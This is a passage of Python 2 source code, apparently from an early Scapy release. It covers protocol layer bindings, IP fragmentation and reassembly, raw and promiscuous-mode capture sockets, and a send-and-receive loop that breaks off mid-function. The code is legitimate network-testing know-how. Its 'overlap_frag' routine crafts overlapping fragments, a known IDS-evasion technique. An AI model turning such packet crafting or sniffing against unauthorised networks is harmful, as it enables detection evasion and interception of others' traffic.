bind_layers( CookedLinux,   LLC,           proto=122)
bind_layers( CookedLinux,   Dot1Q,         proto=33024)
bind_layers( CookedLinux,   Ether,         proto=1)
bind_layers( CookedLinux,   ARP,           proto=2054)
bind_layers( CookedLinux,   IP,            proto=2048)
bind_layers( CookedLinux,   EAPOL,         proto=34958)
bind_layers( CookedLinux,   PPPoED,        proto=34915)
bind_layers( CookedLinux,   PPPoE,         proto=34916)
bind_layers( GRE,           LLC,           proto=122)
bind_layers( GRE,           Dot1Q,         proto=33024)
bind_layers( GRE,           Ether,         proto=1)
bind_layers( GRE,           ARP,           proto=2054)
bind_layers( GRE,           IP,            proto=2048)
bind_layers( GRE,           EAPOL,         proto=34958)
bind_layers( PPPoE,         PPP,           code=0)
bind_layers( EAPOL,         EAP,           type=0)
bind_layers( LLC,           STP,           dsap=66, ssap=66, ctrl=3)
bind_layers( LLC,           SNAP,          dsap=170, ssap=170, ctrl=3)
bind_layers( SNAP,          Dot1Q,         code=33024)
bind_layers( SNAP,          Ether,         code=1)
bind_layers( SNAP,          ARP,           code=2054)
bind_layers( SNAP,          IP,            code=2048)
bind_layers( SNAP,          EAPOL,         code=34958)
bind_layers( SNAP,          STP,           code=267)
bind_layers( IPerror,       IPerror,       frag=0, proto=4)
bind_layers( IPerror,       ICMPerror,     frag=0, proto=1)
bind_layers( IPerror,       TCPerror,      frag=0, proto=6)
bind_layers( IPerror,       UDPerror,      frag=0, proto=17)
bind_layers( IP,            IP,            frag=0, proto=4)
bind_layers( IP,            ICMP,          frag=0, proto=1)
bind_layers( IP,            TCP,           frag=0, proto=6)
bind_layers( IP,            UDP,           frag=0, proto=17)
bind_layers( IP,            GRE,           frag=0, proto=47)
bind_layers( UDP,           SNMP,          sport=161)
bind_layers( UDP,           SNMP,          dport=161)
bind_layers( UDP,           MGCP,          dport=2727)
bind_layers( UDP,           MGCP,          sport=2727)
bind_layers( UDP,           DNS,           dport=53)
bind_layers( UDP,           DNS,           sport=53)
bind_layers( UDP,           ISAKMP,        dport=500, sport=500)
bind_layers( UDP,           HSRP,          dport=1985, sport=1985)
bind_layers( UDP,           NTP,           dport=123, sport=123)
bind_layers( UDP,           BOOTP,         dport=67, sport=68)
bind_layers( UDP,           BOOTP,         dport=68, sport=67)
bind_layers( BOOTP,         DHCP,          options='c\x82Sc')
bind_layers( UDP,           RIP,           sport=520)
bind_layers( UDP,           RIP,           dport=520)
bind_layers( RIP,           RIPEntry,      )
bind_layers( RIPEntry,      RIPEntry,      )
bind_layers( Dot11,         Dot11AssoReq,    subtype=0, type=0)
bind_layers( Dot11,         Dot11AssoResp,   subtype=1, type=0)
bind_layers( Dot11,         Dot11ReassoReq,  subtype=2, type=0)
bind_layers( Dot11,         Dot11ReassoResp, subtype=3, type=0)
bind_layers( Dot11,         Dot11ProbeReq,   subtype=4, type=0)
bind_layers( Dot11,         Dot11ProbeResp,  subtype=5, type=0)
bind_layers( Dot11,         Dot11Beacon,     subtype=8, type=0)
bind_layers( Dot11,         Dot11ATIM,       subtype=9, type=0)
bind_layers( Dot11,         Dot11Disas,      subtype=10, type=0)
bind_layers( Dot11,         Dot11Auth,       subtype=11, type=0)
bind_layers( Dot11,         Dot11Deauth,     subtype=12, type=0)
bind_layers( Dot11Beacon,     Dot11Elt,    )
bind_layers( Dot11AssoReq,    Dot11Elt,    )
bind_layers( Dot11AssoResp,   Dot11Elt,    )
bind_layers( Dot11ReassoReq,  Dot11Elt,    )
bind_layers( Dot11ReassoResp, Dot11Elt,    )
bind_layers( Dot11ProbeReq,   Dot11Elt,    )
bind_layers( Dot11ProbeResp,  Dot11Elt,    )
bind_layers( Dot11Auth,       Dot11Elt,    )
bind_layers( Dot11Elt,        Dot11Elt,    )
bind_layers( TCP,           Skinny,        dport=2000)
bind_layers( TCP,           Skinny,        sport=2000)
bind_layers( UDP,           SebekHead,     sport=1101)
bind_layers( UDP,           SebekHead,     dport=1101)
bind_layers( UDP,           SebekHead,     dport=1101, sport=1101)
bind_layers( SebekHead,     SebekV1,       version=1)
bind_layers( SebekHead,     SebekV2Sock,   version=2, type=2)
bind_layers( SebekHead,     SebekV2,       version=2)
bind_layers( SebekHead,     SebekV3Sock,   version=3, type=2)
bind_layers( SebekHead,     SebekV3,       version=3)
bind_layers( CookedLinux,   IrLAPHead,     proto=23)
bind_layers( IrLAPHead,     IrLAPCommand,  Type=1)
bind_layers( IrLAPCommand,  IrLMP,         )
bind_layers( UDP,           NBNSQueryRequest,  dport=137)
bind_layers( UDP,           NBNSRequest,       dport=137)
bind_layers( UDP,           NBNSQueryResponse, sport=137)
bind_layers( UDP,           NBNSQueryResponseNegative, sport=137)
bind_layers( UDP,           NBNSNodeStatusResponse,    sport=137)
bind_layers( NBNSNodeStatusResponse,        NBNSNodeStatusResponseService, )
bind_layers( NBNSNodeStatusResponse,        NBNSNodeStatusResponseService, )
bind_layers( NBNSNodeStatusResponseService, NBNSNodeStatusResponseService, )
bind_layers( NBNSNodeStatusResponseService, NBNSNodeStatusResponseEnd, )
bind_layers( UDP,           NBNSWackResponse, sport=137)
bind_layers( UDP,           NBTDatagram,      dport=138)
bind_layers( TCP,           NBTSession,       dport=139)
bind_layers( NBTSession,                           SMBNegociate_Protocol_Request_Header, )
bind_layers( SMBNegociate_Protocol_Request_Header, SMBNegociate_Protocol_Request_Tail, )
bind_layers( SMBNegociate_Protocol_Request_Tail,   SMBNegociate_Protocol_Request_Tail, )
bind_layers( NBTSession,    SMBNegociate_Protocol_Response_Advanced_Security,  ExtendedSecurity=1)
bind_layers( NBTSession,    SMBNegociate_Protocol_Response_No_Security,        ExtendedSecurity=0, EncryptionKeyLength=8)
bind_layers( NBTSession,    SMBNegociate_Protocol_Response_No_Security_No_Key, ExtendedSecurity=0, EncryptionKeyLength=0)
bind_layers( NBTSession,    SMBSession_Setup_AndX_Request, )
bind_layers( NBTSession,    SMBSession_Setup_AndX_Response, )
bind_layers( HCI_Hdr,       HCI_ACL_Hdr,   type=2)
bind_layers( HCI_Hdr,       Raw,           )
bind_layers( HCI_ACL_Hdr,   L2CAP_Hdr,     )
bind_layers( L2CAP_Hdr,     L2CAP_CmdHdr,      cid=1)
bind_layers( L2CAP_CmdHdr,  L2CAP_CmdRej,      code=1)
bind_layers( L2CAP_CmdHdr,  L2CAP_ConnReq,     code=2)
bind_layers( L2CAP_CmdHdr,  L2CAP_ConnResp,    code=3)
bind_layers( L2CAP_CmdHdr,  L2CAP_ConfReq,     code=4)
bind_layers( L2CAP_CmdHdr,  L2CAP_ConfResp,    code=5)
bind_layers( L2CAP_CmdHdr,  L2CAP_DisconnReq,  code=6)
bind_layers( L2CAP_CmdHdr,  L2CAP_DisconnResp, code=7)
bind_layers( L2CAP_CmdHdr,  L2CAP_InfoReq,     code=10)
bind_layers( L2CAP_CmdHdr,  L2CAP_InfoResp,    code=11)
bind_layers( UDP,           MobileIP,           sport=434)
bind_layers( UDP,           MobileIP,           dport=434)
bind_layers( MobileIP,      MobileIPRRQ,        type=1)
bind_layers( MobileIP,      MobileIPRRP,        type=3)
bind_layers( MobileIP,      MobileIPTunnelData, type=4)
bind_layers( MobileIPTunnelData, IP,           nexthdr=4)
bind_layers( NetflowHeader,   NetflowHeaderV1, version=1)
bind_layers( NetflowHeaderV1, NetflowRecordV1, )

bind_layers(UDP, TFTP, dport=69)
bind_layers(TFTP, TFTP_RRQ, op=1)
bind_layers(TFTP, TFTP_WRQ, op=2)
bind_layers(TFTP, TFTP_DATA, op=3)
bind_layers(TFTP, TFTP_ACK, op=4)
bind_layers(TFTP, TFTP_ERROR, op=5)
bind_layers(TFTP, TFTP_OACK, op=6)
bind_layers(TFTP_RRQ, TFTP_Options)
bind_layers(TFTP_WRQ, TFTP_Options)
bind_layers(TFTP_OACK, TFTP_Options)


###################
## Fragmentation ##
###################

def fragment(pkt, fragsize=1480):
    fragsize = (fragsize+7)/8*8
    lst = []
    for p in pkt:
        s = str(p[IP].payload)
        nb = (len(s)+fragsize-1)/fragsize
        for i in range(nb):
            q = p.copy()
            del(q[IP].payload)
            del(q[IP].chksum)
            del(q[IP].len)
            if i == nb-1:
                q[IP].flags &= ~1
            else:
                q[IP].flags |= 1
            q[IP].frag = i*fragsize/8
            r = Raw(load=s[i*fragsize:(i+1)*fragsize])
            r.overload_fields = p[IP].payload.overload_fields.copy()
            q.add_payload(r)
            lst.append(q)
    return lst

def overlap_frag(p, overlap, fragsize=8, overlap_fragsize=None):
    if overlap_fragsize is None:
        overlap_fragsize = fragsize
    q = p.copy()
    del(q[IP].payload)
    q[IP].add_payload(overlap)

    qfrag = fragment(q, overlap_fragsize)
    qfrag[-1][IP].flags |= 1
    return qfrag+fragment(p, fragsize)

def defrag(plist):
    """defrag(plist) -> ([not fragmented], [defragmented],
                  [ [bad fragments], [bad fragments], ... ])"""
    frags = {}
    nofrag = PacketList()
    for p in plist:
        ip = p[IP]
        if IP not in p:
            nofrag.append(p)
            continue
        if ip.frag == 0 and ip.flags & 1 == 0:
            nofrag.append(p)
            continue
        uniq = (ip.id,ip.src,ip.dst,ip.proto)
        if uniq in frags:
            frags[uniq].append(p)
        else:
            frags[uniq] = PacketList([p])
    defrag = []
    missfrag = []
    for lst in frags.itervalues():
        lst.sort(lambda x,y:cmp(x.frag, y.frag))
        p = lst[0]
        if p.frag > 0:
            missfrag.append(lst)
            continue
        p = p.copy()
        if Padding in p:
            del(p[Padding].underlayer.payload)
        ip = p[IP]
        if ip.len is None or ip.ihl is None:
            clen = len(ip.payload)
        else:
            clen = ip.len - (ip.ihl<<2)
        txt = Raw()
        for q in lst[1:]:
            if clen != q.frag<<3:
                if clen > q.frag<<3:
                    warning("Fragment overlap (%i > %i) %r || %r ||  %r" % (clen, q.frag<<3, p,txt,q))
                missfrag.append(lst)
                txt = None
                break
            if q[IP].len is None or q[IP].ihl is None:
                clen += len(q[IP].payload)
            else:
                clen += q[IP].len - (q[IP].ihl<<2)
            if Padding in q:
                del(q[Padding].underlayer.payload)
            txt.add_payload(q[IP].payload.copy())

        if txt is None:
            continue

        ip.flags &= ~1 # !MF
        del(ip.chksum)
        del(ip.len)
        p = p/txt
        defrag.append(p)
    defrag2=PacketList()
    for p in defrag:
        defrag2.append(p.__class__(str(p)))
    return nofrag,defrag2,missfrag

def defragment(plist):
    """defrag(plist) -> plist defragmented as much as possible """
    frags = {}
    final = []

    pos = 0
    for p in plist:
        p._defrag_pos = pos
        pos += 1
        if IP in p:
            ip = p[IP]
            if ip.frag != 0 or ip.flags & 1:
                ip = p[IP]
                uniq = (ip.id,ip.src,ip.dst,ip.proto)
                if uniq in frags:
                    frags[uniq].append(p)
                else:
                    frags[uniq] = [p]
                continue
        final.append(p)

    defrag = []
    missfrag = []
    for lst in frags.itervalues():
        lst.sort(lambda x,y:cmp(x.frag, y.frag))
        p = lst[0]
        if p.frag > 0:
            missfrag += lst
            continue
        p = p.copy()
        if Padding in p:
            del(p[Padding].underlayer.payload)
        ip = p[IP]
        if ip.len is None or ip.ihl is None:
            clen = len(ip.payload)
        else:
            clen = ip.len - (ip.ihl<<2)
        txt = Raw()
        for q in lst[1:]:
            if clen != q.frag<<3:
                if clen > q.frag<<3:
                    warning("Fragment overlap (%i > %i) %r || %r ||  %r" % (clen, q.frag<<3, p,txt,q))
                missfrag += lst
                txt = None
                break
            if q[IP].len is None or q[IP].ihl is None:
                clen += len(q[IP].payload)
            else:
                clen += q[IP].len - (q[IP].ihl<<2)
            if Padding in q:
                del(q[Padding].underlayer.payload)
            txt.add_payload(q[IP].payload.copy())

        if txt is None:
            continue

        ip.flags &= ~1 # !MF
        del(ip.chksum)
        del(ip.len)
        p = p/txt
        p._defrag_pos = lst[-1]._defrag_pos
        defrag.append(p)
    defrag2=[]
    for p in defrag:
        q = p.__class__(str(p))
        q._defrag_pos = p._defrag_pos
        defrag2.append(q)
    final += defrag2
    final += missfrag
    final.sort(lambda x,y: cmp(x._defrag_pos, y._defrag_pos))
    for p in final:
        del(p._defrag_pos)

    if hasattr(plist, "listname"):
        name = "Defragmented %s" % plist.listname
    else:
        name = "Defragmented"


    return PacketList(final, name=name)






###################
## Super sockets ##
###################

def Ether_Dot3_Dispatcher(pkt=None, **kargs):
    if type(pkt) is str and len(pkt) >= 14 and struct.unpack("!H", pkt[12:14])[0] <= 1500:
        return Dot3(pkt, **kargs)
    return Ether(pkt, **kargs)

# According to libdnet
LLTypes = { ARPHDR_ETHER : Ether_Dot3_Dispatcher,
            ARPHDR_METRICOM : Ether_Dot3_Dispatcher,
            ARPHDR_LOOPBACK : Ether_Dot3_Dispatcher,
            12 : IP,
            101 : IP,
            801 : Dot11,
            802 : PrismHeader,
            803 : RadioTap,
            105 : Dot11,
            113 : CookedLinux,
            119 : PrismHeader, # for atheros
            127 : RadioTap,
            144 : CookedLinux, # called LINUX_IRDA, similar to CookedLinux
            783 : IrLAPHead,
            0xB1E70073L : HCI_Hdr, # I invented this one
            }

LLNumTypes = { Ether : ARPHDR_ETHER,
               IP  : 12,
               IP  : 101,
               Dot11  : 801,
               PrismHeader : 802,
               RadioTap    : 803,
               RadioTap    : 127,
               Dot11 : 105,
               CookedLinux : 113,
               CookedLinux : 144,
               IrLAPHead : 783
            }

L3Types = { ETH_P_IP : IP,
            ETH_P_ARP : ARP,
            ETH_P_ALL : IP
            }


def flush_fd(fd):
    if type(fd) is not int:
        fd = fd.fileno()
    while 1:
        r,w,e = select([fd],[],[],0)
        if r:
            os.read(fd,MTU)
        else:
            break

class SuperSocket:
    closed=0
    def __init__(self, family=socket.AF_INET,type=socket.SOCK_STREAM, proto=0):
        self.ins = socket.socket(family, type, proto)
        self.outs = self.ins
        self.promisc=None
    def send(self, x):
        sx = str(x)
        x.sent_time = time.time()
        return self.outs.send(sx)
    def recv(self, x):
        return Raw(self.ins.recv(x))
    def fileno(self):
        return self.ins.fileno()
    def close(self):
        if self.closed:
            return
        self.closed=1
        if self.ins != self.outs:
            if self.outs and self.outs.fileno() != -1:
                self.outs.close()
        if self.ins and self.ins.fileno() != -1:
            self.ins.close()
    def bind_in(self, addr):
        self.ins.bind(addr)
    def bind_out(self, addr):
        self.outs.bind(addr)


class L3RawSocket(SuperSocket):
    def __init__(self, type = ETH_P_IP, filter=None, iface=None, promisc=None, nofilter=0):
        self.outs = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.outs.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
        self.ins = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(type))
    def recv(self, x):
        return Ether(self.ins.recv(x)).payload
    def send(self, x):
        try:
            sx = str(x)
            x.sent_time = time.time()
            self.outs.sendto(sx,(x.dst,0))
        except socket.error,msg:
            log_runtime.error(msg)



class L3PacketSocket(SuperSocket):
    def __init__(self, type = ETH_P_ALL, filter=None, promisc=None, iface=None, nofilter=0):
        self.type = type
        self.ins = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(type))
        self.ins.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
        flush_fd(self.ins)
        if not nofilter:
            if conf.except_filter:
                if filter:
                    filter = "(%s) and not (%s)" % (filter, conf.except_filter)
                else:
                    filter = "not (%s)" % conf.except_filter
            if filter is not None:
                attach_filter(self.ins, filter)
        self.ins.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
        self.outs = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(type))
        self.outs.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)
        if promisc is None:
            promisc = conf.promisc
        self.promisc = promisc
        if self.promisc:
            if iface is None:
                self.iff = get_if_list()
            else:
                if iface.__class__ is list:
                    self.iff = iface
                else:
                    self.iff = [iface]
            for i in self.iff:
                set_promisc(self.ins, i)
    def close(self):
        if self.closed:
            return
        self.closed=1
        if self.promisc:
            for i in self.iff:
                set_promisc(self.ins, i, 0)
        SuperSocket.close(self)
    def recv(self, x):
        pkt, sa_ll = self.ins.recvfrom(x)
        if sa_ll[2] == socket.PACKET_OUTGOING:
            return None
        if LLTypes.has_key(sa_ll[3]):
            cls = LLTypes[sa_ll[3]]
            lvl = 2
        elif L3Types.has_key(sa_ll[1]):
            cls = L3Types[sa_ll[1]]
            lvl = 3
        else:
            warning("Unable to guess type (interface=%s protocol=%#x family=%i). Using Ethernet" % (sa_ll[0],sa_ll[1],sa_ll[3]))
            cls = Ether
            lvl = 2

        try:
            pkt = cls(pkt)
        except KeyboardInterrupt:
            raise
        except:
            if conf.debug_dissector:
                raise
            pkt = Raw(pkt)
        if lvl == 2:
            pkt = pkt.payload

        if pkt is not None:
            pkt.time = get_last_packet_timestamp(self.ins)
        return pkt

    def send(self, x):
        if isinstance(x, IPv6):
            iff,a,gw = conf.route6.route(x.dst)
        elif hasattr(x,"dst"):
            iff,a,gw = conf.route.route(x.dst)
        else:
            iff = conf.iface
        sdto = (iff, self.type)
        self.outs.bind(sdto)
        sn = self.outs.getsockname()
        ll = lambda x:x
        if sn[3] in (ARPHDR_PPP,ARPHDR_TUN):
            sdto = (iff, ETH_P_IP)
        if LLTypes.has_key(sn[3]):
            ll = lambda x:LLTypes[sn[3]]()/x
        try:
            sx = str(ll(x))
            x.sent_time = time.time()
            self.outs.sendto(sx, sdto)
        except socket.error,msg:
            x.sent_time = time.time()  # bad approximation
            if conf.auto_fragment and msg[0] == 90:
                for p in fragment(x):
                    self.outs.sendto(str(ll(p)), sdto)
            else:
                raise




class L2Socket(SuperSocket):
    def __init__(self, iface = None, type = ETH_P_ALL, filter=None, nofilter=0):
        if iface is None:
            iface = conf.iface
        self.ins = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(type))
        self.ins.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
        flush_fd(self.ins)
        if not nofilter:
            if conf.except_filter:
                if filter:
                    filter = "(%s) and not (%s)" % (filter, conf.except_filter)
                else:
                    filter = "not (%s)" % conf.except_filter
            if filter is not None:
                attach_filter(self.ins, filter)
        self.ins.bind((iface, type))
        self.ins.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
        self.outs = self.ins
        self.outs.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)
        sa_ll = self.outs.getsockname()
        if LLTypes.has_key(sa_ll[3]):
            self.LL = LLTypes[sa_ll[3]]
        elif L3Types.has_key(sa_ll[1]):
            self.LL = L3Types[sa_ll[1]]
        else:
            warning("Unable to guess type (interface=%s protocol=%#x family=%i). Using Ethernet" % (sa_ll[0],sa_ll[1],sa_ll[3]))
            self.LL = Ether

    def recv(self, x):
        pkt, sa_ll = self.ins.recvfrom(x)
        if sa_ll[2] == socket.PACKET_OUTGOING:
            return None
        try:
            q = self.LL(pkt)
        except KeyboardInterrupt:
            raise
        except:
            if conf.debug_dissector:
                raise
            q = Raw(pkt)
        q.time = get_last_packet_timestamp(self.ins)
        return q


class L2ListenSocket(SuperSocket):
    def __init__(self, iface = None, type = ETH_P_ALL, promisc=None, filter=None, nofilter=0):
        self.type = type
        self.outs = None
        self.ins = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(type))
        self.ins.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
        flush_fd(self.ins)
        if iface is not None:
            self.ins.bind((iface, type))
        if not nofilter:
            if conf.except_filter:
                if filter:
                    filter = "(%s) and not (%s)" % (filter, conf.except_filter)
                else:
                    filter = "not (%s)" % conf.except_filter
            if filter is not None:
                attach_filter(self.ins, filter)
        if promisc is None:
            promisc = conf.sniff_promisc
        self.promisc = promisc
        if iface is None:
            self.iff = get_if_list()
        else:
            if iface.__class__ is list:
                self.iff = iface
            else:
                self.iff = [iface]
        if self.promisc:
            for i in self.iff:
                set_promisc(self.ins, i)
        self.ins.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
    def close(self):
        if self.promisc:
            for i in self.iff:
                set_promisc(self.ins, i, 0)
        SuperSocket.close(self)

    def recv(self, x):
        pkt, sa_ll = self.ins.recvfrom(x)
        if LLTypes.has_key(sa_ll[3]):
            cls = LLTypes[sa_ll[3]]
        elif L3Types.has_key(sa_ll[1]):
            cls = L3Types[sa_ll[1]]
        else:
            warning("Unable to guess type (interface=%s protocol=%#x family=%i). Using Ethernet" % (sa_ll[0],sa_ll[1],sa_ll[3]))
            cls = Ether

        try:
            pkt = cls(pkt)
        except KeyboardInterrupt:
            raise
        except:
            if conf.debug_dissector:
                raise
            pkt = Raw(pkt)
        pkt.time = get_last_packet_timestamp(self.ins)
        return pkt

    def send(self, x):
        raise Scapy_Exception("Can't send anything with L2ListenSocket")



class L3dnetSocket(SuperSocket):
    def __init__(self, type = ETH_P_ALL, filter=None, promisc=None, iface=None, nofilter=0):
        self.iflist = {}
        self.ins = pcap.pcapObject()
        if iface is None:
            iface = conf.iface
        self.iface = iface
        self.ins.open_live(iface, 1600, 0, 100)
        try:
            ioctl(self.ins.fileno(),BIOCIMMEDIATE,struct.pack("I",1))
        except:
            pass
        if nofilter:
            if type != ETH_P_ALL:  # PF_PACKET stuff. Need to emulate this for pcap
                filter = "ether proto %i" % type
            else:
                filter = None
        else:
            if conf.except_filter:
                if filter:
                    filter = "(%s) and not (%s)" % (filter, conf.except_filter)
                else:
                    filter = "not (%s)" % conf.except_filter
            if type != ETH_P_ALL:  # PF_PACKET stuff. Need to emulate this for pcap
                if filter:
                    filter = "(ether proto %i) and (%s)" % (type,filter)
                else:
                    filter = "ether proto %i" % type
        if filter:
            self.ins.setfilter(filter, 0, 0)
    def send(self, x):
        if isinstance(x, IPv6):
            iff,a,gw = conf.route6.route(x.dst)
        elif hasattr(x,"dst"):
            iff,a,gw = conf.route.route(x.dst)
        else:
            iff = conf.iface
        ifs = self.iflist.get(iff)
        if ifs is None:
            self.iflist[iff] = ifs = dnet.eth(iff)
        sx = str(Ether()/x)
        x.sent_time = time.time()
        ifs.send(sx)
    def recv(self,x=MTU):
        ll = self.ins.datalink()
        if LLTypes.has_key(ll):
            cls = LLTypes[ll]
        else:
            warning("Unable to guess datalink type (interface=%s linktype=%i). Using Ethernet" % (self.iface, ll))
            cls = Ether

        pkt = self.ins.next()
        if pkt is not None:
            l,pkt,ts = pkt
        if pkt is None:
            return

        try:
            pkt = cls(pkt)
        except KeyboardInterrupt:
            raise
        except:
            if conf.debug_dissector:
                raise
            pkt = Raw(pkt)
        pkt.time = ts
        return pkt.payload

    def nonblock_recv(self):
        self.ins.setnonblock(1)
        p = self.recv()
        self.ins.setnonblock(0)
        return p

    def close(self):
        if hasattr(self, "ins"):
            del(self.ins)
        if hasattr(self, "outs"):
            del(self.outs)

class L2dnetSocket(SuperSocket):
    def __init__(self, iface = None, type = ETH_P_ALL, filter=None, nofilter=0):
        if iface is None:
            iface = conf.iface
        self.iface = iface
        self.ins = pcap.pcapObject()
        self.ins.open_live(iface, 1600, 0, 100)
        try:
            ioctl(self.ins.fileno(),BIOCIMMEDIATE,struct.pack("I",1))
        except:
            pass
        if nofilter:
            if type != ETH_P_ALL:  # PF_PACKET stuff. Need to emulate this for pcap
                filter = "ether proto %i" % type
            else:
                filter = None
        else:
            if conf.except_filter:
                if filter:
                    filter = "(%s) and not (%s)" % (filter, conf.except_filter)
                else:
                    filter = "not (%s)" % conf.except_filter
            if type != ETH_P_ALL:  # PF_PACKET stuff. Need to emulate this for pcap
                if filter:
                    filter = "(ether proto %i) and (%s)" % (type,filter)
                else:
                    filter = "ether proto %i" % type
        if filter:
            self.ins.setfilter(filter, 0, 0)
        self.outs = dnet.eth(iface)
    def recv(self,x):
        ll = self.ins.datalink()
        if LLTypes.has_key(ll):
            cls = LLTypes[ll]
        else:
            warning("Unable to guess datalink type (interface=%s linktype=%i). Using Ethernet" % (self.iface, ll))
            cls = Ether

        pkt = self.ins.next()
        if pkt is not None:
            l,pkt,ts = pkt
        if pkt is None:
            return

        try:
            pkt = cls(pkt)
        except KeyboardInterrupt:
            raise
        except:
            if conf.debug_dissector:
                raise
            pkt = Raw(pkt)
        pkt.time = ts
        return pkt

    def nonblock_recv(self):
        self.ins.setnonblock(1)
        p = self.recv(MTU)
        self.ins.setnonblock(0)
        return p

    def close(self):
        if hasattr(self, "ins"):
            del(self.ins)
        if hasattr(self, "outs"):
            del(self.outs)





class L2pcapListenSocket(SuperSocket):
    def __init__(self, iface = None, type = ETH_P_ALL, promisc=None, filter=None):
        self.type = type
        self.outs = None
        self.ins = pcap.pcapObject()
        self.iface = iface
        if iface is None:
            iface = conf.iface
        if promisc is None:
            promisc = conf.sniff_promisc
        self.promisc = promisc
        self.ins.open_live(iface, 1600, self.promisc, 100)
        try:
            ioctl(self.ins.fileno(),BIOCIMMEDIATE,struct.pack("I",1))
        except:
            pass
        if type == ETH_P_ALL: # Do not apply any filter if Ethernet type is given
            if conf.except_filter:
                if filter:
                    filter = "(%s) and not (%s)" % (filter, conf.except_filter)
                else:
                    filter = "not (%s)" % conf.except_filter
            if filter:
                self.ins.setfilter(filter, 0, 0)

    def close(self):
        del(self.ins)

    def recv(self, x):
        ll = self.ins.datalink()
        if LLTypes.has_key(ll):
            cls = LLTypes[ll]
        else:
            warning("Unable to guess datalink type (interface=%s linktype=%i). Using Ethernet" % (self.iface, ll))
            cls = Ether

        pkt = None
        while pkt is None:
            pkt = self.ins.next()
            if pkt is not None:
                l,pkt,ts = pkt

        try:
            pkt = cls(pkt)
        except KeyboardInterrupt:
            raise
        except:
            if conf.debug_dissector:
                raise
            pkt = Raw(pkt)
        pkt.time = ts
        return pkt

    def send(self, x):
        raise Scapy_Exception("Can't send anything with L2pcapListenSocket")


class SimpleSocket(SuperSocket):
    def __init__(self, sock):
        self.ins = sock
        self.outs = sock


class StreamSocket(SimpleSocket):
    def __init__(self, sock, basecls=Raw):
        SimpleSocket.__init__(self, sock)
        self.basecls = basecls

    def recv(self, x=MTU):
        pkt = self.ins.recv(x, socket.MSG_PEEK)
        x = len(pkt)
        pkt = self.basecls(pkt)
        pad = pkt[Padding]
        if pad is not None and pad.underlayer is not None:
            del(pad.underlayer.payload)
        while pad is not None and not isinstance(pad, NoPayload):
            x -= len(pad.load)
            pad = pad.payload
        self.ins.recv(x)
        return pkt


class BluetoothL2CAPSocket(SuperSocket):
    def __init__(self, peer):
        s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW,
                          socket.BTPROTO_L2CAP)
        s.connect((peer,0))

        self.ins = self.outs = s

    def recv(self, x):
        return L2CAP_CmdHdr(self.ins.recv(x))


class BluetoothHCISocket(SuperSocket):
    def __init__(self, iface=0x10000, type=None):
        s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        s.setsockopt(socket.SOL_HCI, socket.HCI_DATA_DIR,1)
        s.setsockopt(socket.SOL_HCI, socket.HCI_TIME_STAMP,1)
        s.setsockopt(socket.SOL_HCI, socket.HCI_FILTER, struct.pack("IIIh2x", 0xffffffffL,0xffffffffL,0xffffffffL,0)) #type mask, event mask, event mask, opcode
        s.bind((iface,))
        self.ins = self.outs = s
#        s.connect((peer,0))


    def recv(self, x):
        return HCI_Hdr(self.ins.recv(x))



####################
## Send / Receive ##
####################




def sndrcv(pks, pkt, timeout = 2, inter = 0, verbose=None, chainCC=0, retry=0, multi=0):
    if not isinstance(pkt, Gen):
        pkt = SetGen(pkt)

    if verbose is None:
        verbose = conf.verb
    debug.recv = PacketList([],"Unanswered")
    debug.sent = PacketList([],"Sent")
    debug.match = SndRcvList([])
    nbrecv=0
    ans = []
    # do it here to fix random fields, so that parent and child have the same
    all_stimuli = tobesent = [p for p in pkt]
    notans = len(tobesent)

    hsent={}
    for i in tobesent:
        h = i.hashret()
        if h in hsent:
            hsent[h].append(i)
        else:
            hsent[h] = [i]
    if retry < 0:
        retry = -retry
        autostop=retry
    else:
        autostop=0


    while retry >= 0:
        found=0

        if timeout < 0:
            timeout = None

        rdpipe,wrpipe = os.pipe()
        rdpipe=os.fdopen(rdpipe)
        wrpipe=os.fdopen(wrpipe,"w")

        pid=1
        try:
            pid = os.fork()
            if pid == 0:
                try:
                    sys.stdin.close()
                    rdpipe.close()
                    try:
                        i = 0
                        if verbose:
                            print "Begin emission:"
                        for p in tobesent:
                            pks.send(p)
                            i += 1
                            time.sleep(inter)
                        if verbose:
                            print "Finished to send %i packets." % i
                    except SystemExit:
                        pass
                    except KeyboardInterrupt:
                        pass
                    except:
                        log_runtime.exception("--- Error in child %i" % os.getpid())
                        log_runtime.info("--- Error in child %i" % os.getpid())
                finally:
                    try:
                        os.setpgrp() # Chance process group to avoid ctrl-C
                        sent_times = [p.sent_time for p in all_stimuli if p.sent_time]
                        cPickle.dump( (arp_cache,sent_times), wrpipe )
                        wrpipe.close()
                    except:
                        pass
            elif pid < 0:
                log_runtime.error("fork error")
            else:
                wrpipe.close()
                stoptime = 0
                remaintime = None
                inmask = [rdpipe,pks]
                try:
                    try:
                        while 1:
                            if stoptime:
                                remaintime = stoptime-time.time()
                                if remaintime <= 0:
                                    break
                            r = None
                            if FREEBSD or DARWIN:
                                inp, out, err = select(inmask,[],[], 0.05)
                                if len(inp) == 0 or pks in inp:
                                    r = pks.nonblock_recv()
                            else:
                                inp, out, err = select(inmask,[],[], remaintime)
                                if len(inp) == 0:
                                    break
                                if pks in inp:
                                    r = pks.recv(MTU)
                            if rdpipe in inp:
                                if timeout:
                                    stoptime = time.time()+timeout
                                del(inmask[inmask.index(rdpipe)])
                            if r is None:
                                continue
                            ok = 0
                            h = r.hashret()
                            if h in hsent:
                                hlst = hsent[h]
                                for i in range(len(hlst)):
                                    if r.answers(hlst[i]):
                                        ans.append((hlst[i],r))
                                        if verbose > 1:
